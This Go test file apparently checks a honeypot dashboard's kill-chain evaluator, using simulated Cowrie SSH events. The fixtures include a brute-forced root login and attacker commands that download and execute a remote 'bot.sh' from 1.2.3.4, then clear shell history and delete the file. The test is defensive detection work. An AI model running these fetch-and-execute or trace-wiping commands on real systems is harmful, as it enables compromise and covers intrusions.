package killchain

import (
	"testing"
	"time"

	"sec_dash/backend/internal/models"
)

func TestEvaluateKillChain(t *testing.T) {
	events := []*models.EnrichedEvent{
		{
			EventID:   "cowrie.session.connect",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			SSHVersion: "SSH-2.0-OpenSSH_8.2p1",
		},
		{
			EventID:   "cowrie.login.failed",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Username:  "admin",
			Password:  "admin",
		},
		{
			EventID:   "cowrie.login.success",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Username:  "root",
			Password:  "123456",
		},
		{
			EventID:   "cowrie.command.input",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Input:     "uname -a && whoami",
		},
		{
			EventID:   "cowrie.command.input",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Input:     "wget http://1.2.3.4/bot.sh",
		},
		{
			EventID:   "cowrie.command.input",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Input:     "chmod +x bot.sh && ./bot.sh",
		},
		{
			EventID:   "cowrie.command.input",
			Timestamp: time.Now(),
			SourceIP:  "198.51.100.4",
			Input:     "history -c && rm -rf /tmp/bot.sh",
		},
	}

	phases := Evaluate(events)
	if len(phases) != 7 {
		t.Fatalf("expected 7 kill chain phases, got %d", len(phases))
	}

	// Phase 1 (Reconnaissance) should be achieved
	if phases[0].Status != "achieved" {
		t.Errorf("expected phase 1 achieved, got %s", phases[0].Status)
	}

	// Phase 2 (Weaponization) should be achieved
	if phases[1].Status != "achieved" {
		t.Errorf("expected phase 2 achieved, got %s", phases[1].Status)
	}

	// Phase 3 (Exploitation) should be achieved
	if phases[2].Status != "achieved" {
		t.Errorf("expected phase 3 achieved, got %s", phases[2].Status)
	}

	// Phase 4 (Discovery) should be achieved
	if phases[3].Status != "achieved" {
		t.Errorf("expected phase 4 achieved, got %s", phases[3].Status)
	}

	// Phase 5 (Tool Transfer) should be achieved
	if phases[4].Status != "achieved" {
		t.Errorf("expected phase 5 achieved, got %s", phases[4].Status)
	}

	// Phase 6 (Execution) should be achieved
	if phases[5].Status != "achieved" {
		t.Errorf("expected phase 6 achieved, got %s", phases[5].Status)
	}

	// Phase 7 (Evasion) should be achieved
	if phases[6].Status != "achieved" {
		t.Errorf("expected phase 7 achieved, got %s", phases[6].Status)
	}
}
